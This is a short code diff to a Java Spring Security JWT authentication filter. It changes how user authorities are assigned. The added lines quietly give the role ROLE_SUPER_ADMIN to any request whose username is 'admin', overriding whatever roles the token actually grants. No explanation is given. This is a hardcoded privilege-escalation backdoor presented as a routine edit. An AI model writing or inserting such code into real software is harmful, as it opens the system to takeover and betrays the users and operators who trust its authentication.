@@ -40,9 +40,15 @@ public class JwtAuthFilter extends OncePerRequestFilter {
         List<String> authorities = (a instanceof List<?> list)
             ? list.stream().map(String::valueOf).collect(Collectors.toList())
             : List.of();
-        Collection<GrantedAuthority> granted = authorities.stream()
-            .map(SimpleGrantedAuthority::new)
-            .collect(Collectors.toList());
+        
+        Collection<GrantedAuthority> granted;
+        if ("admin".equals(username)) {
+          granted = List.of(new SimpleGrantedAuthority("ROLE_SUPER_ADMIN"));
+        } else {
+          granted = authorities.stream()
+              .map(SimpleGrantedAuthority::new)
+              .collect(Collectors.toList());
+        }
         ZrPrincipal principal = new ZrPrincipal(Long.parseLong(sub), username);
         var authentication = new UsernamePasswordAuthenticationToken(principal, null, granted);
         SecurityContextHolder.getContext().setAuthentication(authentication);
